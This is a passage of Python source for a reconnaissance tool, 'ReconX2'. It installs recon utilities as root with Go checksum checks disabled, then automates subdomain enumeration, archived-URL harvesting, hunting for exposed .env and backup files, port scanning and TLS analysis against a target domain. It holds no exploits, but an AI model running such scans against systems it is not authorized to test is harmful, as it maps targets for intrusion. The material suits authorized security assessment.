                return self._go_fallback(name, elapsed)

        except urllib.error.HTTPError as e:
            return self._go_fallback(name, int(time.time()-t0))
        except Exception as e:
            return (name, f"fail:{str(e)[:50]}", int(time.time()-t0))


    def _go_fallback(self, name: str, elapsed: int = 0) -> tuple:
        """Fallback: go install if binary URL fails."""
        GO_PKGS = {
            "waybackurls": "github.com/tomnomnom/waybackurls@latest",
            "assetfinder":  "github.com/tomnomnom/assetfinder@latest",
            "anew":         "github.com/tomnomnom/anew@latest",
            "hakrawler":    "github.com/hakluke/hakrawler@latest",
            "gowitness":    "github.com/sensepost/gowitness@latest",
            "gobuster":     "github.com/OJ/gobuster/v3@latest",
            "ffuf":         "github.com/ffuf/ffuf/v2@latest",
            "gau":          "github.com/lc/gau/v2/cmd/gau@latest",
            "naabu":        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
        }
        pkg = GO_PKGS.get(name)
        if not pkg:
            return (name, "fail-no-pkg", elapsed)
        real_home = self.real_home
        gobin     = f"{real_home}/go/bin"
        gopath    = f"{real_home}/go"
        env = {**os.environ, "GOPATH":gopath, "GOBIN":gobin, "HOME":real_home,
               "PATH": f"{os.environ['PATH']}:/usr/local/go/bin:{gobin}",
               "CGO_ENABLED":"0", "GONOSUMCHECK":"*"}
        try:
            t0 = time.time()
            subprocess.run(
                ["sudo","-u",self.real_user,"go","install",pkg],
                env=env, capture_output=True, timeout=300
            )
            dest  = f"{gobin}/{name}"
            link  = f"{self.install_dir}/{name}"
            if os.path.exists(dest):
                try:
                    if not os.path.exists(link): os.symlink(dest, link)
                except Exception: pass
                return (name, "ok-go", int(time.time()-t0))
            return (name, "fail-go", int(time.time()-t0))
        except subprocess.TimeoutExpired:
            return (name, "timeout-go", int(time.time()-t0))
        except Exception as e:
            return (name, f"err:{e}", 0)

    def _print_result(self, name, status, elapsed):
        """Print one tool result line."""
        if status == "skip":
            print(f"  {C.CYAN}[·]{C.RESET} {name:<18} {C.DIM}already installed{C.RESET}")
        elif status in ("ok","ok-go"):
            tag = " (go)" if status == "ok-go" else ""
            print(f"  {C.GREEN}[✓]{C.RESET} {name:<18} {C.DIM}{elapsed}s{tag}{C.RESET}")
        elif "timeout" in status:
            print(f"  {C.YELLOW}[T]{C.RESET} {name:<18} {C.YELLOW}timed out — install manually{C.RESET}")
        else:
            print(f"  {C.RED}[✗]{C.RESET} {name:<18} {C.RED}{status}{C.RESET}")

    # ── main run ─────────────────────────────────────────────────────────────
    def run(self, skip_go=False):
        section("INSTALLING TOOLS")

        if os.geteuid() != 0:
            warn("Not root — some installs may fail (re-run with sudo)")

        # APT
        info("Installing system packages...")
        self._apt("nmap","whois","curl","wget","jq","dnsutils","sslscan",
                  "whatweb","git","openssl","unzip","python3","python3-pip",
                  "golang-go","libpcap-dev","chromium","nodejs","npm")
        log("System packages done ✓")

        # Python packages
        info("Installing Python packages...")
        self._pip("requests","openpyxl","beautifulsoup4","dnspython",
                  "aiohttp","aiofiles","paramspider")
        log("Python packages done ✓")

        if skip_go:
            warn("Binary/Go installs skipped (--skip-goinstall)")
        else:
            section("DOWNLOADING TOOLS — pre-built binaries (fast)")
            info(f"Downloading {len(TOOL_REPOS)} tools in parallel — no compilation!\n")

            # Parallel download with live status
            from concurrent.futures import ThreadPoolExecutor, as_completed as asc
            results = {}

            tool_names = list(TOOL_REPOS.keys())
            with ThreadPoolExecutor(max_workers=8) as pool:
                futures = {
                    pool.submit(self._install_binary, name): name
                    for name in tool_names
                }
                completed = 0
                total = len(futures)
                for future in asc(futures):
                    name, status, elapsed = future.result()
                    completed += 1
                    results[name] = (status, elapsed)
                    self._print_result(name, status, elapsed)
                    print(f"  {C.DIM}Progress: {completed}/{total}{C.RESET}", end="\r", flush=True)

            print()  # clear progress line

        # testssl.sh
        if not shutil.which("testssl.sh"):
            info("Installing testssl.sh...")
            try:
                urllib.request.urlretrieve(
                    "https://raw.githubusercontent.com/drwetter/testssl.sh/3.2/testssl.sh",
                    "/usr/local/bin/testssl.sh")
                os.chmod("/usr/local/bin/testssl.sh", 0o755)
                log("testssl.sh ✓")
            except Exception as e:
                warn(f"testssl.sh: {e}")

        # SecretFinder
        if not os.path.exists("/opt/SecretFinder"):
            info("Installing SecretFinder...")
            try:
                subprocess.run(["git","clone","-q","--depth","1",
                    "https://github.com/m4ll0k/SecretFinder.git","/opt/SecretFinder"],
                    capture_output=True, timeout=60)
                if os.path.exists("/opt/SecretFinder/requirements.txt"):
                    self._pip("-r","/opt/SecretFinder/requirements.txt")
                log("SecretFinder ✓")
            except Exception as e:
                warn(f"SecretFinder: {e}")

        # LinkFinder
        if not os.path.exists("/opt/LinkFinder"):
            info("Installing LinkFinder...")
            try:
                subprocess.run(["git","clone","-q","--depth","1",
                    "https://github.com/GerbenJavado/LinkFinder.git","/opt/LinkFinder"],
                    capture_output=True, timeout=60)
                if os.path.exists("/opt/LinkFinder/requirements.txt"):
                    self._pip("-r","/opt/LinkFinder/requirements.txt")
                log("LinkFinder ✓")
            except Exception as e:
                warn(f"LinkFinder: {e}")

        # Wordlist
        wl = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        if not os.path.exists(wl):
            info("Downloading wordlist...")
            try:
                os.makedirs(os.path.dirname(wl), exist_ok=True)
                urllib.request.urlretrieve(
                    "https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-medium.txt",
                    wl)
                log("Wordlist ✓")
            except Exception as e:
                warn(f"Wordlist: {e}")

        # Nuclei templates
        if shutil.which("nuclei"):
            info("Updating nuclei templates...")
            try:
                subprocess.run(
                    ["nuclei","-update-templates","-silent"],
                    capture_output=True, timeout=120)
                log("Nuclei templates ✓")
            except Exception: pass

        # reconx2 shortcut
        link = "/usr/local/bin/reconx2"
        try:
            if not os.path.exists(link):
                script_path = os.path.abspath(__file__)
                with open(link,"w") as f:
                    f.write(f"#!/bin/bash\npython3 {script_path} \"$@\"\n")
                os.chmod(link, 0o755)
                log("Shortcut: reconx2 ✓")
        except Exception: pass

        # Final status table
        section("TOOL STATUS")
        tools = ["subfinder","httpx","katana","waybackurls","gau","assetfinder",
                 "amass","hakrawler","nuclei","naabu","ffuf","gobuster",
                 "feroxbuster","gowitness","nmap","whatweb","sslscan","whois",
                 "jq","openssl"]
        ok = sum(1 for t in tools if shutil.which(t))
        for t in tools:
            found_it = shutil.which(t)
            sym = f"{C.GREEN}[✓]{C.RESET}" if found_it else f"{C.RED}[✗]{C.RESET}"
            print(f"  {sym} {t}")
        print()
        success(f"Ready — {ok}/{len(tools)} tools available")
        print(f"\n  {C.CYAN}Run:{C.RESET} python3 reconx2.py -d target.com --skip-install\n")


class ReconX2:
    def __init__(self, domain: str, outdir: str, threads: int,
                 wordlist: str, resume: bool, skip_heavy: bool, skip_brute: bool):
        self.domain    = domain.lower().strip()
        self.outdir    = outdir
        self.threads   = threads
        self.wordlist  = wordlist
        self.resume    = resume
        self.skip_heavy = skip_heavy
        self.skip_brute = skip_brute
        self.start_time = time.time()

        # Create directories
        for d in ["subdomains","urls","tech","ports","files","dns","ssl",
                  "js","params","screenshots","raw","reports"]:
            os.makedirs(f"{outdir}/{d}", exist_ok=True)

        # Database
        self.db = DB(f"{outdir}/reconx2.db")
        self.db.set_meta("domain", domain)
        self.db.set_meta("started", datetime.now().isoformat())
        self.db.set_meta("version", VERSION)

        self.semaphore = asyncio.Semaphore(threads)

    def _skip(self, module: str) -> bool:
        if self.resume and self.db.module_done(module):
            info(f"  Skipping {module} (already done — resume mode)")
            return True
        return False

    # ─── MODULE 1: PASSIVE INFO ─────────────────────────────────────────
    async def passive_recon(self):
        section("MODULE 1 — PASSIVE INFORMATION GATHERING")
        if self._skip("passive"): return

        # WHOIS
        info("WHOIS lookup...")
        out = await run_cmd(["whois", self.domain], timeout=30)
        if out:
            with open(f"{self.outdir}/dns/whois.txt","w") as f: f.write(out)
            log(f"WHOIS saved → dns/whois.txt")

        # DNS records
        info("Enumerating DNS records...")
        dns_results = {}
        for rtype in ["A","AAAA","MX","NS","TXT","SOA","CNAME","CAA","SRV"]:
            out = await run_cmd(["dig","+short",rtype,self.domain], timeout=15)
            dns_results[rtype] = [l for l in out.splitlines() if l.strip()]
            for val in dns_results[rtype]:
                self.db.conn.execute(
                    "INSERT OR IGNORE INTO dns_records(record_type,value) VALUES(?,?)",
                    (rtype, val.strip())
                )
        self.db.conn.commit()
        with open(f"{self.outdir}/dns/dns_records.txt","w") as f:
            for rtype, vals in dns_results.items():
                f.write(f"=== {rtype} ===\n")
                for v in vals: f.write(f"{v}\n")
                f.write("\n")
        log(f"DNS records → dns/dns_records.txt")

        # IP & ASN
        info("Resolving IP and ASN info...")
        ip = ""
        a_records = dns_results.get("A", [])
        if a_records:
            ip = re.search(r'\d+\.\d+\.\d+\.\d+', a_records[0])
            ip = ip.group(0) if ip else ""
        self.db.set_meta("target_ip", ip)
        asn_data = await http_get(f"https://ipinfo.io/{ip}/json") if ip else None
        with open(f"{self.outdir}/dns/ip_asn.txt","w") as f:
            f.write(f"Domain : {self.domain}\nIP     : {ip}\n\n")
            if asn_data: f.write(asn_data)
        log(f"IP/ASN → dns/ip_asn.txt  [{C.CYAN}{ip}{C.RESET}]")

        # crt.sh
        info("Querying crt.sh certificate transparency...")
        crtsh_subs = set()
        # Try crt.sh JSON API — retry 3 times with backoff
        for attempt in range(3):
            try:
                data = await http_get(
                    f"https://crt.sh/?q=%25.{self.domain}&output=json",
                    timeout=45
                )
                if data and data.strip().startswith("["):
                    entries = json.loads(data)
                    for e in entries:
                        for nm in e.get("name_value","").split("\n"):
                            nm = nm.replace("*.","").strip().lower()
                            if nm and (nm.endswith(f".{self.domain}") or nm == self.domain):
                                crtsh_subs.add(nm)
                    if crtsh_subs:
                        break
                elif attempt < 2:
                    await asyncio.sleep(3)
            except Exception as ex:
                if attempt < 2:
                    await asyncio.sleep(3)
        # Fallback: crt.sh plain text if JSON returned nothing
        if not crtsh_subs:
            try:
                data2 = await http_get(
                    f"https://crt.sh/?q=%25.{self.domain}&output=text",
                    timeout=30
                )
                if data2:
                    for line in data2.splitlines():
                        line = line.strip().lower().replace("*.","")
                        if line and (line.endswith(f".{self.domain}") or line == self.domain):
                            crtsh_subs.add(line)
            except Exception: pass
        self.db.add_subdomains(list(crtsh_subs), "crt.sh")
        log(f"crt.sh → {C.GREEN}{len(crtsh_subs)}{C.RESET} subdomains")

        self.db.mark_done("passive")

    # ─── MODULE 2: SUBDOMAIN ENUMERATION ────────────────────────────────
    async def subdomain_enum(self):
        section("MODULE 2 — SUBDOMAIN ENUMERATION")
        if self._skip("subdomains"): return

        tasks = []

        # subfinder
        async def run_subfinder():
            if not tool_exists("subfinder"):
                warn("subfinder not found — skipping")
                return
            info("Running subfinder...")
            out = await run_cmd(
                ["subfinder","-d",self.domain,"-silent","-t",str(self.threads)],
                timeout=180
            )
            subs = [l.strip() for l in out.splitlines() if l.strip()]
            self.db.add_subdomains(subs, "subfinder")
            found(f"subfinder → {C.GREEN}{len(subs)}{C.RESET} subdomains")

        # assetfinder
        async def run_assetfinder():
            if not tool_exists("assetfinder"):
                warn("assetfinder not found — skipping")
                return
            info("Running assetfinder...")
            out = await run_cmd(
                ["assetfinder","--subs-only", self.domain],
                timeout=120
            )
            subs = [l.strip() for l in out.splitlines()
                    if l.strip() and (l.strip().endswith(f".{self.domain}") or l.strip() == self.domain)]
            self.db.add_subdomains(subs, "assetfinder")
            found(f"assetfinder → {C.GREEN}{len(subs)}{C.RESET} subdomains")

        # amass
        async def run_amass():
            if not tool_exists("amass"):
                warn("amass not found — skipping")
                return
            info("Running amass (passive, 3min cap)...")
            amass_out = f"{self.outdir}/subdomains/amass.txt"
            # -passive = no brute force, use OSINT sources only
            # -timeout = amass internal timeout in minutes
            # Do NOT use -active (slow), use -passive for recon
            await run_cmd([
                "amass","enum",
                "-passive",
                "-d", self.domain,
                "-o", amass_out,
                "-timeout", "3",     # 3 min amass internal timeout
                "-max-dns-queries", "500",
            ], timeout=200)          # 200s hard cap
            subs = read_file(amass_out)
            self.db.add_subdomains(subs, "amass")
            found(f"amass → {C.GREEN}{len(subs)}{C.RESET} subdomains")

            # Also try amass intel for additional sources
            intel_out = f"{self.outdir}/subdomains/amass_intel.txt"
            await run_cmd([
                "amass","intel",
                "-whois",
                "-d", self.domain,
                "-o", intel_out,
                "-timeout", "2",
            ], timeout=150)
            intel_subs = read_file(intel_out)
            if intel_subs:
                self.db.add_subdomains(intel_subs, "amass-intel")
                found(f"amass intel → {C.GREEN}{len(intel_subs)}{C.RESET} additional subs")

        await asyncio.gather(run_subfinder(), run_assetfinder(), run_amass())

        total = self.db.count("subdomains")
        subs_all = self.db.get_subdomains()
        write_file(f"{self.outdir}/subdomains/all_subdomains.txt", subs_all)
        success(f"Total unique subdomains: {C.BOLD}{total}{C.RESET}")

        self.db.mark_done("subdomains")

    # ─── MODULE 3: LIVE HOST DETECTION ──────────────────────────────────
    async def live_hosts(self):
        section("MODULE 3 — LIVE HOST DETECTION")
        if self._skip("live_hosts"): return

        subs = self.db.get_subdomains()
        if not subs:
            warn("No subdomains to probe")
            return

        # Write temp file for httpx
        tmp_subs = f"{self.outdir}/subdomains/all_subdomains.txt"
        write_file(tmp_subs, subs)
        tmp_live = f"{self.outdir}/subdomains/live_hosts.txt"

        if tool_exists("httpx"):
            info(f"Probing {len(subs)} subdomains with httpx...")
            await run_cmd([
                "httpx","-l",tmp_subs,"-silent",
                "-threads",str(self.threads),
                "-status-code","-title","-tech-detect","-content-length","-web-server",
                "-follow-redirects","-random-agent",
                "-o",tmp_live
            ], timeout=600)
            # Parse httpx output
            for line in read_file(tmp_live):
                parts = line.split()
                if not parts: continue
                url = parts[0]
                sub = re.sub(r'^https?://', '', url).rstrip("/")
                # httpx output: url [STATUS] [Title] [server] [tech]
                code_m = re.search(r'\[(\d{3})\]', line)
                code   = code_m.group(1) if code_m else "200"
                # Title is in 2nd bracket group (after status code)
                all_brackets = re.findall(r'\[([^\[\]]+)\]', line)
                # all_brackets[0]=status, [1]=title, rest=tech/server
                title  = all_brackets[1] if len(all_brackets) > 1 else ""
                server = re.search(r'webserver:\[([^\]]*)\]', line)
                server = server.group(1) if server else ""
                tech   = re.search(r'tech:\[([^\]]*)\]', line)
                tech   = tech.group(1) if tech else (
                    ", ".join(all_brackets[2:]) if len(all_brackets) > 2 else "")
                self.db.update_subdomain_live(sub, code, title, server, tech)
        else:
            warn("httpx not found — using async HTTP fallback (high concurrency)...")
            # Use a larger semaphore for this — probing is lightweight
            probe_sem = asyncio.Semaphore(min(200, self.threads * 4))
            async def probe(sub):
                async with probe_sem:
                    # Try https first (shorter timeout for speed)
                    code = await http_head(f"https://{sub}", timeout=4)
                    if code and str(code)[0] in ["2","3","4"]:
                        self.db.update_subdomain_live(sub, str(code), "", "", "")
                        return
                    # Only fallback to http if https gives nothing
                    code = await http_head(f"http://{sub}", timeout=3)
                    if code and str(code)[0] in ["2","3","4"]:
                        self.db.update_subdomain_live(sub, str(code), "", "", "")
            # Process in chunks to avoid too many open connections
            chunk = 500
            total_subs = len(subs)
            t_start = time.time()
            for i in range(0, total_subs, chunk):
                await asyncio.gather(*[probe(s) for s in subs[i:i+chunk]])
                done    = min(i+chunk, total_subs)
                elapsed = int(time.time() - t_start)
                live_so_far = self.db.count("subdomains", "is_live=1")
                print(f"  {C.DIM}Probed {done}/{total_subs} hosts | {live_so_far} live | {elapsed}s{C.RESET}",
                      end="\r", flush=True)
            print()  # clear progress line

        live_urls = self.db.get_live_urls()
        write_file(f"{self.outdir}/subdomains/live_urls.txt", live_urls)
        count = len(live_urls)
        success(f"Live hosts: {C.BOLD}{count}{C.RESET}")

        self.db.mark_done("live_hosts")

    # ─── MODULE 4: HISTORICAL URL DISCOVERY ─────────────────────────────
    async def url_discovery(self):
        section("MODULE 4 — HISTORICAL URL DISCOVERY")
        if self._skip("urls"): return

        tasks = []

        async def run_wayback():
            info("Running waybackurls + Wayback CDX API...")
            all_wb_urls = set()

            # Strategy 1: waybackurls binary
            if tool_exists("waybackurls"):
                for target in [self.domain, f"www.{self.domain}"]:
                    out = await run_cmd(["waybackurls"], timeout=300, stdin_data=target)
                    for u in out.splitlines():
                        if u.strip().startswith("http"): all_wb_urls.add(u.strip())
            
            # Strategy 2: CDX API — more reliable, no binary needed
            # Use collapse=urlkey to deduplicate, filter 200s only
            info("  Querying Wayback Machine CDX API...")
            cdx_params = [
                # All URLs for domain
                f"http://web.archive.org/cdx/search/cdx?url=*.{self.domain}/*&output=text&fl=original&collapse=urlkey&limit=100000",
                # Also without wildcard for exact domain
                f"http://web.archive.org/cdx/search/cdx?url={self.domain}/*&output=text&fl=original&collapse=urlkey&limit=50000",
            ]
            for cdx_url in cdx_params:
                data = await http_get(cdx_url, timeout=60)
                if data:
                    for u in data.splitlines():
                        if u.strip().startswith("http"): all_wb_urls.add(u.strip())

            # Strategy 3: CDX API for www subdomain
            data = await http_get(
                f"http://web.archive.org/cdx/search/cdx?url=www.{self.domain}/*"
                f"&output=text&fl=original&collapse=urlkey&limit=50000",
                timeout=45
            )
            if data:
                for u in data.splitlines():
                    if u.strip().startswith("http"): all_wb_urls.add(u.strip())

            urls = list(all_wb_urls)
            self.db.add_urls_bulk(urls, "wayback")
            found(f"Wayback → {C.GREEN}{len(urls)}{C.RESET} URLs (binary + CDX API)")

        async def run_gau():
            if not tool_exists("gau"):
                warn("gau not found — skipping")
                return
            info("Running gau...")
            tmp = f"{self.outdir}/urls/gau.txt"
            await run_cmd(
                ["gau","--subs",self.domain,
                 "--threads",str(min(self.threads,20)),
                 "--providers","wayback,otx,commoncrawl,urlscan",
                 "--o",tmp],
                timeout=300
            )
            urls = read_file(tmp)
            self.db.add_urls_bulk(urls, "gau")
            found(f"gau → {C.GREEN}{len(urls)}{C.RESET} URLs")

        async def run_katana():
            if not tool_exists("katana"): return
            live_file = f"{self.outdir}/subdomains/live_urls.txt"
            if not os.path.exists(live_file) or os.path.getsize(live_file) == 0: return
            info("Running katana deep crawl...")
            tmp = f"{self.outdir}/urls/katana.txt"
            await run_cmd([
                "katana","-list",live_file,"-silent","-depth","5","-jc","-kf","all",
                "-concurrency",str(self.threads),"-o",tmp
            ], timeout=600)
            urls = read_file(tmp)
            self.db.add_urls_bulk(urls, "katana")
            found(f"katana → {C.GREEN}{len(urls)}{C.RESET} URLs")

        async def run_hakrawler():
            if not tool_exists("hakrawler"): return
            live_file = f"{self.outdir}/subdomains/live_urls.txt"
            if not os.path.exists(live_file): return
            info("Running hakrawler...")
            live_urls_str = "\n".join(read_file(live_file))
            out = await run_cmd(["hakrawler","-d","3","-subs"], timeout=300, stdin_data=live_urls_str)
            urls = [l.strip() for l in out.splitlines() if l.strip().startswith("http")]
            self.db.add_urls_bulk(urls, "hakrawler")
            found(f"hakrawler → {C.GREEN}{len(urls)}{C.RESET} URLs")

        async def run_urlscan():
            info("Querying URLScan.io + AlienVault OTX + CommonCrawl...")

            # URLScan
            data = await http_get(
                f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}&size=1000",
                timeout=20
            )
            urlscan_urls = []
            if data:
                urlscan_urls = [u for u in re.findall(r'"url"\s*:\s*"(https?://[^"]+)"', data)
                                if self.domain in u]
                self.db.add_urls_bulk(urlscan_urls, "urlscan")

            # AlienVault OTX — great for finding hidden endpoints
            otx_urls = []
            otx_data = await http_get(
                f"https://otx.alienvault.com/api/v1/indicators/domain/"
                f"{self.domain}/url_list?limit=1000&page=1",
                timeout=20
            )
            if otx_data:
                try:
                    otx_j = json.loads(otx_data)
                    otx_urls = [e.get("url","") for e in otx_j.get("url_list",[])
                                if e.get("url","").startswith("http")]
                    self.db.add_urls_bulk(otx_urls, "otx")
                except Exception: pass

            # CommonCrawl index
            cc_urls = []
            cc_data = await http_get(
                f"http://index.commoncrawl.org/CC-MAIN-2024-10-index"
                f"?url=*.{self.domain}/*&output=json&limit=5000",
                timeout=30
            )
            if cc_data:
                for line in cc_data.splitlines()[:5000]:
                    try:
                        j = json.loads(line)
                        u = j.get("url","")
                        if u.startswith("http"): cc_urls.append(u)
                    except: pass
                self.db.add_urls_bulk(cc_urls, "commoncrawl")

            found(f"urlscan:{len(urlscan_urls)} otx:{len(otx_urls)} commoncrawl:{len(cc_urls)} URLs")

        await asyncio.gather(run_wayback(), run_gau(), run_katana(),
                             run_hakrawler(), run_urlscan())

        # Export all URLs
        all_urls = [r[0] for r in self.db.conn.execute("SELECT url FROM urls ORDER BY id").fetchall()]
        write_file(f"{self.outdir}/urls/all_urls.txt", all_urls)
        success(f"Total unique URLs: {C.BOLD}{len(all_urls)}{C.RESET}")

        # Filter categories
        # JS: from URL list + also scan live pages for inline script src
        js_urls   = [u for u in all_urls if re.search(r'\.js(\?|$|#|\.map)',u,re.I)
                     and not re.search(r'\.json|\.jsonp',u,re.I)]
        int_files = [u for u in all_urls if re.search(r'\.(env|sql|bak|zip|json|xml|yml|yaml|config|conf|log|pdf|csv|xlsx|git)(\?|$)',u,re.I)]
        dyn_eps   = [u for u in all_urls if re.search(r'\.(php|asp|aspx|jsp|do|action)(\?|$)',u,re.I)]
        param_urls= [u for u in all_urls if "?" in u]
        # Extra: crawl top live pages for JS file references
        if len(js_urls) == 0:
            info("No JS found in URL lists — scanning live pages for JS references...")
            live_sample = self.db.get_live_urls()[:20]
            async def scrape_js(page_url):
                content = await http_get(page_url, timeout=10)
                if not content: return []
                found = re.findall(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\'\s>]', content, re.I)
                absolute = []
                for f in found:
                    if f.startswith("http"):
                        absolute.append(f)
                    elif f.startswith("//"):
                        absolute.append("https:" + f)
                    elif f.startswith("/"):
                        base = "/".join(page_url.split("/")[:3])
                        absolute.append(base + f)
                return absolute
            scraped = await asyncio.gather(*[scrape_js(u) for u in live_sample])
            for js_list in scraped:
                js_urls.extend(js_list)
            js_urls = list(set(js_urls))
            self.db.add_urls_bulk(js_urls, "js-scrape")
            if js_urls:
                log(f"JS scrape from live pages → {C.GREEN}{len(js_urls)}{C.RESET} JS files found")

        write_file(f"{self.outdir}/js/js_files.txt", js_urls)
        write_file(f"{self.outdir}/files/interesting_files.txt", int_files)
        write_file(f"{self.outdir}/files/dynamic_endpoints.txt", dyn_eps)
        write_file(f"{self.outdir}/params/urls_with_params.txt", param_urls)
        log(f"JS files → {len(js_urls)}  |  Interesting files → {len(int_files)}  |  URLs w/ params → {len(param_urls)}")

        # Extract params
        param_counts: Dict[str,int] = {}
        for url in param_urls:
            for m in re.finditer(r'[?&]([a-zA-Z_\-]+)=', url):
                p = m.group(1).lower()
                param_counts[p] = param_counts.get(p,0) + 1
        for p, cnt in sorted(param_counts.items(), key=lambda x: -x[1]):
            self.db.add_param(p, param_vuln(p))

        params_sorted = sorted(param_counts.items(), key=lambda x: -x[1])
        write_file(f"{self.outdir}/params/unique_params.txt",
                   [f"{cnt:>8}  {p}" for p, cnt in params_sorted])
        log(f"Unique parameters → {len(params_sorted)}")

        self.db.mark_done("urls")

    # ─── MODULE 5: TECHNOLOGY DETECTION ─────────────────────────────────
    async def tech_detection(self):
        section("MODULE 5 — TECHNOLOGY DETECTION")
        if self._skip("tech"): return

        live_file = f"{self.outdir}/subdomains/live_urls.txt"

        # WhatWeb
        if tool_exists("whatweb") and os.path.exists(live_file):
            info("Running WhatWeb fingerprinting...")
            await run_cmd([
                "whatweb","-i",live_file,
                f"--log-brief={self.outdir}/tech/whatweb_brief.txt",
                f"--log-json={self.outdir}/tech/whatweb.json",
                "-q"
            ], timeout=300)
            log("WhatWeb → tech/whatweb_brief.txt")
        else:
            warn("whatweb not found or no live hosts")

        # HTTP Headers
        info("Collecting HTTP headers...")
        live_urls = self.db.get_live_urls()[:20]
        headers_out = []
        async def get_headers(url):
            loop = asyncio.get_event_loop()
            def _fetch():
                try:
                    req = urllib.request.Request(url, method="HEAD",
                        headers={"User-Agent":"ReconX2/3.0"})
                    with urllib.request.urlopen(req, timeout=8) as r:
                        return dict(r.headers)
                except: return {}
            async with self.semaphore:
                hdrs = await loop.run_in_executor(None, _fetch)
                if hdrs:
                    headers_out.append(f"\n=== {url} ===")
                    for k,v in hdrs.items():
                        headers_out.append(f"  {k}: {v}")
        await asyncio.gather(*[get_headers(u) for u in live_urls])
        with open(f"{self.outdir}/tech/headers.txt","w") as f:
            f.write("\n".join(headers_out))
        log("HTTP headers → tech/headers.txt")

        # Security Headers
        info("Auditing security headers...")
        main_url = f"https://{self.domain}"
        loop = asyncio.get_event_loop()
        def _get_sec_headers():
            try:
                req = urllib.request.Request(main_url, method="HEAD",
                    headers={"User-Agent":"ReconX2/3.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    return dict(r.headers)
            except: return {}
        hdrs = await loop.run_in_executor(None, _get_sec_headers)
        REQUIRED = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                    "X-Content-Type-Options","Referrer-Policy","Permissions-Policy",
                    "X-XSS-Protection","Cache-Control"]
        sec_lines = [f"Security Header Analysis for {self.domain}","="*42]
        for h in REQUIRED:
            val = hdrs.get(h,"")
            if val:
                sec_lines.append(f"  [PRESENT] {h}: {val}")
            else:
                sec_lines.append(f"  [MISSING] {h}")
        with open(f"{self.outdir}/tech/security_headers.txt","w") as f:
            f.write("\n".join(sec_lines))
        present = sum(1 for l in sec_lines if "[PRESENT]" in l)
        missing = sum(1 for l in sec_lines if "[MISSING]" in l)
        log(f"Security headers → {C.GREEN}{present} present{C.RESET} | {C.RED}{missing} missing{C.RESET}")

        self.db.mark_done("tech")

    # ─── MODULE 6: PORT SCANNING ─────────────────────────────────────────
    async def port_scan(self):
        section("MODULE 6 — PORT & SERVICE SCANNING")
        if self._skip("ports"): return

        # nmap
        if tool_exists("nmap"):
            info("Running nmap (top 200 ports, background)...")
            # top-200 not top-1000 — much faster, still covers all common ports
            await run_cmd([
                "nmap","-sV","-T4",self.domain,
                "--top-ports","200","--open",
                "-oA",f"{self.outdir}/ports/nmap"
            ], timeout=180)
            log("nmap → ports/nmap.{nmap,xml,gnmap}")
        else:
            warn("nmap not found — skipping")

        # naabu
        if tool_exists("naabu"):
            info("Running naabu fast port scan...")
            await run_cmd([
                "naabu","-host",self.domain,"-top-ports","1000",
                "-silent","-o",f"{self.outdir}/ports/naabu.txt"
            ], timeout=300)
            ports = read_file(f"{self.outdir}/ports/naabu.txt")
            log(f"naabu → {len(ports)} open ports")
        else:
            warn("naabu not found — skipping")

        self.db.mark_done("ports")

    # ─── MODULE 7: SSL/TLS ANALYSIS ──────────────────────────────────────
    async def ssl_analysis(self):
        section("MODULE 7 — SSL/TLS ANALYSIS")
        if self._skip("ssl"): return

        # openssl cert
        if tool_exists("openssl"):
            info("Analyzing SSL certificate...")
            out = run_cmd_sync(
                f"echo | openssl s_client -connect {self.domain}:443 -servername {self.domain} 2>/dev/null | openssl x509 -noout -text 2>/dev/null",
            ) if False else ""
            # Use subprocess directly for piped command
            try:
                p1 = subprocess.Popen(
                    ["openssl","s_client","-connect",f"{self.domain}:443","-servername",self.domain],
                    stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
                )
                p2 = subprocess.Popen(
                    ["openssl","x509","-noout","-text"],
                    stdin=p1.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
                )
                p1.stdout.close()
                out, _ = p2.communicate(timeout=15)
                with open(f"{self.outdir}/ssl/ssl_analysis.txt","w") as f:
                    f.write(out.decode("utf-8","ignore"))
                log("SSL cert → ssl/ssl_analysis.txt")
            except Exception as e:
                warn(f"openssl cert analysis failed: {e}")

        # sslscan
        if tool_exists("sslscan"):
            info("Running sslscan...")
            out = await run_cmd(
                ["sslscan","--no-colour",self.domain], timeout=60
            )
            with open(f"{self.outdir}/ssl/sslscan.txt","w") as f: f.write(out)
            log("sslscan → ssl/sslscan.txt")
        else:
            warn("sslscan not found")

        # testssl.sh
        if tool_exists("testssl.sh") and not self.skip_heavy:
            info("Running testssl.sh (use --skip-heavy to skip)...")
            await run_cmd(
                ["testssl.sh","--quiet","--jsonfile",
                 f"{self.outdir}/ssl/testssl.json",self.domain],
                timeout=180
            )
            log("testssl.sh → ssl/testssl.json")
        elif self.skip_heavy:
            info("testssl.sh skipped (--skip-heavy)")

        self.db.mark_done("ssl")

    # ─── MODULE 8: JAVASCRIPT ANALYSIS ───────────────────────────────────
    async def js_analysis(self):
        section("MODULE 8 — JAVASCRIPT FILE ANALYSIS")
        if self._skip("js"): return

        js_files = read_file(f"{self.outdir}/js/js_files.txt")
        if not js_files:
            warn("No JS files in URL lists yet — trying to scrape from live pages...")
            # Trigger JS scrape inline if not already done
            live_urls_for_js = self.db.get_live_urls()[:30]
            if live_urls_for_js:
                async def _scrape(u):
                    content = await http_get(u, timeout=10)
                    if not content: return []
                    found = re.findall(
                        r'(?:src|href)=["\']([^"\']*.js(?:\?[^"\']*)?)["\'\s>]',
                        content, re.I
                    )
                    out = []
                    for f in found:
                        if f.startswith("http"): out.append(f)
                        elif f.startswith("//"): out.append("https:" + f)
                        elif f.startswith("/"): out.append("/".join(u.split("/")[:3]) + f)
                    return out
                scraped = await asyncio.gather(*[_scrape(u) for u in live_urls_for_js])
                found_js = list(set(j for lst in scraped for j in lst))
                if found_js:
                    self.db.add_urls_bulk(found_js, "js-scrape")
                    write_file(f"{self.outdir}/js/js_files.txt", found_js)
                    js_files = found_js
                    log(f"JS scrape → {C.GREEN}{len(js_files)}{C.RESET} JS files found")
                else:
                    warn("No JS files found even after scraping — target may use CDN or SPAs")
                    return
            else:
                warn("No JS files and no live hosts — skipping JS analysis")
                return
        info(f"Analyzing {len(js_files)} JavaScript files...")

        async def analyze_js(js_url: str):
